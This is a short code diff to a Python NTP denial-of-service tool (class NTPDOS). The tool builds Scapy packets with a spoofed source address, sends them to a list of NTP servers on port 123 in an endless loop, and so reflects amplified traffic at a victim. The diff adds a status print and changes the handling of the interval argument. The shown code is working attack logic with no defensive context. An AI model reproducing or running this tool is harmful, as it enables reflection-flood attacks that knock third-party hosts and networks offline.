@@ -17,6 +17,7 @@ class NTPDOS:
     def __del__(self):
         pass
     def core(self):
+        print self.ip + ":" + self.stack[self.index] + ":" + str(self.count)
         packet = IP(src = self.ip, dst = self.stack[self.index]) / UDP(sport = 80, dport = 123) / self.cmd
         send(packet, verbose = 0)
         self.count = self.count + 1
@@ -30,7 +31,7 @@ def main():
             ntpdos.stack.append(server.strip())
         while not 0:
             ntpdos.core()
-            if "--interval" in sys.argv and float(sys.argv[sys.argv.index("--interval") + 1]) != 0:
+            if "--interval" in sys.argv:
                 time.sleep(float(sys.argv[sys.argv.index("--interval") + 1]) / 1000)
     return 0
 
